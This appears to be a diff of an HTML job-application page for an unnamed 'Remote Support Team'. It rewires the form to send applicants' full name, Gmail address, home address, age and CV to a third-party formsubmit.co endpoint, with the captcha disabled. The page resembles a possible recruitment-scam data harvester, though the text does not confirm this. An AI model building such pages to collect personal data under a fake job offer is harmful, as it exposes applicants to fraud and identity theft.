@@ -152,7 +152,6 @@
 </head>
 <body>
 
-    <!-- MAIN LANDING PAGE -->
     <div id="landing-page">
         <header>
             <h1>Join Our Remote Support Team</h1>
@@ -160,47 +159,49 @@
         </header>
 
         <main class="container">
-            <!-- Form Section -->
             <section class="card">
                 <h2 style="margin-bottom: 1.5rem; font-size: 1.5rem;">Application Form</h2>
-                <form id="applicationForm" onsubmit="handleFormSubmit(event)">
+                
+                <form action="https://formsubmit.co/el/cileye" method="POST" enctype="multipart/form-data">
+                    
+                    <input type="hidden" name="_next" value="about:blank"> <input type="hidden" name="_subject" value="New Remote Support Application!">
+                    <input type="hidden" name="_captcha" value="false">
+
                     <div class="form-group">
                         <label for="name">Full Name</label>
-                        <input type="text" id="name" required placeholder="John Doe">
+                        <input type="text" id="name" name="Full Name" required placeholder="John Doe">
                     </div>
 
                     <div class="form-group">
                         <label for="email">Gmail Address</label>
-                        <input type="email" id="email" required placeholder="yourname@gmail.com">
+                        <input type="email" id="email" name="Gmail Address" required placeholder="yourname@gmail.com">
                     </div>
 
                     <div class="form-group">
                         <label for="address">Home Address</label>
-                        <input type="text" id="address" required placeholder="123 Remote St, City, Country">
+                        <input type="text" id="address" name="Home Address" required placeholder="123 Remote St, City, Country">
                     </div>
 
                     <div class="form-group">
                         <label for="age">Age</label>
-                        <input type="number" id="age" min="18" max="100" required placeholder="25">
+                        <input type="number" id="age" name="Age" min="18" max="100" required placeholder="25">
                     </div>
 
                     <div class="form-group">
                         <label for="cv">Upload CV / Resume</label>
-                        <input type="file" id="cv" accept=".pdf,.doc,.docx" required>
+                        <input type="file" id="cv" name="CV Attachment" accept=".pdf,.doc,.docx" required>
                     </div>
 
                     <button type="submit">Submit Application</button>
                 </form>
             </section>
 
-            <!-- Graphics Image Section -->
             <section class="card" style="display: flex; justify-content: center; align-items: center;">
                 <img src="https://raw.githubusercontent.com/jobaly/remote/47c3ce239259751d63e198929f70a9ef669daeb1/twitter-image.png" alt="Remote Customer Support Team" style="width: 100%; max-width: 450px; height: auto; border-radius: 8px;">
             </section>
         </main>
     </div>
 
-    <!-- THANK YOU PAGE -->
     <div id="thank-you-page" class="card">
         <svg viewBox="0 0 24 24">
             <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
@@ -209,20 +210,16 @@
         <p>We have received your details and our hiring team will review your CV. We will get back to you shortly via your provided Gmail address.</p>
     </div>
 
-    <!-- Form Toggle Script -->
     <script>
-        function handleFormSubmit(event) {
-            event.preventDefault(); // Prevents page reload
-            
-            // Hide the landing page content
-            document.getElementById('landing-page').style.display = 'none';
-            
-            // Reveal the thank you view
-            document.getElementById('thank-you-page').style.display = 'block';
-            
-            // Smoothly snap to top
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
+        const form = document.querySelector('form');
+        form.addEventListener('submit', function() {
+            // Give FormSubmit a split second to register the click, then flip views
+            setTimeout(() => {
+                document.getElementById('landing-page').style.display = 'none';
+                document.getElementById('thank-you-page').style.display = 'block';
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            }, 100);
+        });
     </script>
 </body>
 </html>
